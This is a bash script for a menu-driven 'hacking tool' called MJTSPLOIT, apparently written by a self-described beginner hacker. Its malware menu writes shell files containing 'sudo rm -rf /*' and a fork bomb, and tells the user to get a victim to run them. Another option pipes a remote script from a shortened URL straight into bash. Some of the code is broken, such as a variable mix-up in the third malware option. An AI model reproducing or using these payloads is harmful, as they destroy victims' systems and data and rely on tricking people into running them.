function menu(){
  clear
  echo "[+] Select from the menu"
  echo ""
  echo "[1] Read about the developer.."
  echo "[2] Generate Malware.."
  echo "[3] Check open ports in your ip address.."
  echo "[4] Show the ip of DNS.."
  echo "[5] Show information about a website by DNS.."
  echo "[6] Your country whether today on terminal.."
  echo "[7] World map on terminal.."
  echo "[8] Control your android phone.."
  echo "[9] Install Metasploit for termux.."
  echo "[99] EXIT MJTSPLOIT TOOL."
  read menuin
}
function exitt(){
   clear
   echo -e "\033[0;37m                             ..:::::::::.."
   echo -e "\033[0;37m                        ..:::aad8888888baa:::.." 
   echo -e "\033[0;37m                    .::::d:?88888888888?::8b::::."
   echo -e "\033[0;37m                  .:::d8888:?88888888??a888888b:::."
   echo -e "\033[0;37m                .:::d8888888a8888888aa8888888888b:::."
   echo -e "\033[0;37m               ::::dP::::::::88888888888::::::::Yb::::"
   echo -e "\033[0;37m              ::::dP:::::::::Y888888888P:::::::::Yb::::"
   echo -e "\033[0;37m             ::::d8:::::::::::Y8888888P:::::::::::8b::::"
   echo -e "\033[0;37m            .::::88::::::::::::Y88888P::::::::::::88::::."
   echo -e "\033[0;37m            :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::"
   echo -e "\033[0;37m            :::::::Y88888888888P::|::Y88888888888P:::::::"
   echo -e "\033[0;37m            ::::::::::::::::888:::|:::888::::::::::::::::"
   echo -e "\033[0;37m            ::::::::::::::::8888888888888b:::::::::::::::"
   echo -e "\033[0;37m             :::::::::::::::88888888888888::::::::::::::"
   echo -e "\033[0;37m               :::::::::::::d88888888888888:::::::::::::"
   echo -e "\033[0;37m                ::::::::::::88::88::88:::88::::::::::::"
   echo -e "\033[0;37m                 :::::::::::88::88::88:::88:::::::::::"
   echo -e "\033[0;37m                   :::::::::88::88::P::::88:::::::::"
   echo -e "\033[0;37m                     :::::::88::88:::::::88:::::::"
   echo -e "\033[0;37m                        :::::::::::::::::::::::"
   echo -e "\033[0;37m                            ..:::::::::.."
   echo ""
   echo -e "\033[0;37m                    Thanks For Using MJTSPLOIT tool.."
   echo -e "\033[0;37m                   Dont Forget to follow me on github"
   echo -e "\033[0;37m                       https://github.com/Mr6MJT"
   echo ""
   exit
}

clear
sleep 5
echo -e "\033[0;37m starting the MJTSPLOIT tool.."
sleep 2
clear
echo -e "\033[0;31m       ___  ___       _   _____   _____   _____   _       _____   _   _____ "
echo -e "\033[0;31m      /   |/   |     | | |_   _| /  ___/ |  _  \ | |     /  _  \ | | |_   _| "
echo -e "\033[0;31m     / /|   /| |     | |   | |   | |___  | |_| | | |     | | | | | |   | | "
echo -e "\033[0;31m    / / |__/ | |  _  | |   | |   \___  \ |  ___/ | |     | | | | | |   | | "
echo -e "\033[0;31m   / /       | | | |_| |   | |    ___| | | |     | |___  | |_| | | |   | | "
echo -e "\033[0;31m  /_/        |_| \_____/   |_|   /_____/ |_|     |_____| \_____/ |_|   |_| "
#sleep 2
echo -e "\033[0;31m ========================================================================="
echo -e "\033[0;31m              Hello guys,This simple tool coded by Mr MJT                "
#sleep 0.2
echo -e "\033[0;31m ========================================================================="
echo -e "\033[0;31m      Iam not responsible for anything you may do by this tool         "
#sleep 0.2
echo -e "\033[0;31m ========================================================================="
echo ""
echo ""
sleep 1
echo -e "\033[0;37m-Type help to get list of commands with their descriptions.."
read help
if [[ $help == help ]]
then
  menu
else
  echo "error.."
fi
if [[ $menuin -eq 1 ]]
then
  clear
  echo "Mr MJT,is a lebanese beginner hacker,who is a  hobbyist of cyber security.."
  echo "Since his childhood,Mr MJT has been a lover of technology and loves"
  echo "to learn programming,but he did not know any thing about programming he"
  echo "thinks that the programmer is a rare and genius person,Mr MJT is assisted"
  echo "by his older brother he is professional in computer maintenance,he"
  echo "teached Mr MJT when he was young,until Mr MJT know the plan he would"
  echo "follow in order to become a professional hacker.."
  echo "Mr MJT recieved encouragement from his family,friends and some" 
  echo "cousins to continue learning,Mr MJT wishes to establish a company"
  echo "in the future,He started with simple ingredients and did not stop learning"
  echo "despite the difficulties he was faced with a weak computer.."
  sleep 3
  echo ""
  echo "[+] press enter to exit MJTSPLOIT tool"
  read v
  exitt
elif [[ $menuin -eq 2 ]]
then
  clear
  echo "[+] Select from the menu"
  echo ""
  echo "[1] Generate first malware ----> Destroy the victim operating system"
  echo "[2] Generate second malware -----> Increase tempreture of victim cpu and use all ram"
  echo "[3] Generate third malware -----> Destroy the victim operating system & Increase tempreture of cpu and use all ram"
  echo "[99] Exit MJTSPLOIT tool"
  read mal
elif [[ $menuin -eq 3 ]]
then
  clear
  echo "[+] enter your ip address please: "
  read ip
  nmap -sV $ip
  echo "[+] press enter to exit MJTSPLOIT tool"
  read ff
  exitt
elif [[ $menuin -eq 4 ]]
then
  clear
  echo "[+] enter the DNS <example:google.com>"
  read dns
  ping $dns
elif [[ $menuin -eq 5 ]]
then
  clear
  echo "[+] enter the DNS <example:google.com>"
  read dnss
  dig $dnss
elif [[ $menuin -eq 6 ]]
then
  clear
  curl wttr.in/$country
elif [[ $menuin -eq 7 ]]
then
  clear
  telnet mapscii.me
elif [[ $menuin -eq 8 ]]
then
  clear
  echo "[+] please connect your android phone to this pc via USB"
  sleep 2
  sudo apt install adb scrcpy
  scrcpy
elif [[ $menuin -eq 9 ]]
then
  clear
  bash <(curl -fsSL "https://git.io/abhacker-repo") --install ruby=2.7.2 --allow-downgrades
  pkg install metasploit
elif [[ $menuin -eq 99 ]]
then
  exitt
else
  echo "error.."
fi
if [[ $mal -eq 1 ]]
then
  clear
  echo "[+] enter the malware file name please: "
  read malna
  touch $malna.sh
  echo "sudo rm -rf /*" > $malna.sh
  sleep 0.5
  echo "[+] the file saved at MJTSPLOIT DIRECTORY (size 15 bytes).."
  sleep 0.5
  echo "[+] DONT RUN THE MALWARE ON YOUR DEVICE!! JUST TELL THE VICTIM TO RUN IT"
  sleep 0.5
  echo "[+] press enter to exit MJTSPLOIT tool"
  read fffff
  exitt
elif [[ $mal -eq 2 ]]
then
  clear
  echo "[+] enter the malware file name please: "
  read malnat
  touch $malnat.sh
  echo ":(){ :|: & };:" > $malnat.sh
  sleep 0.5
  echo "[+] the file saved at MJTSPLOIT DIRECTORY (size 12 bytes).."
  sleep 0.5
  echo "[+] DONT RUN THIS MALWARE ON YOUR DEVICE!! JUST TELL THE VICTIM TO RUN IT"
  sleep 0.5
  echo "[+] press enter to exit MJTSPLOIT tool"
  read ksj
  exitt
elif [[ $mal -eq 3 ]]
then
  clear
  echo "[+] enter the malware file name please: "
  read maalnat
  touch $maalnat.sh
  echo "sudo rm -rf /*" > $maalnat.sh
  echo ":(){ :|: & };:" > $malnat.sh
  sleep 0.5
  echo "[+] the file saved at MJTSPLOIT DIRECTORY.."
  sleep 0.5
  echo "[+] DONT RUN THIS MALWARE ON YOUR DEVICE!! JUST TELL THE VICTIM TO RUN IT"
  sleep 0.5
  echo "[+] press enter to exit MJTSPLOIT tool"
  read kjkkk 
  exitt
elif [[ $mal -eq 99 ]]
then
  exitt
else
  sleep 0.5
  echo "error.."
  exit
fi
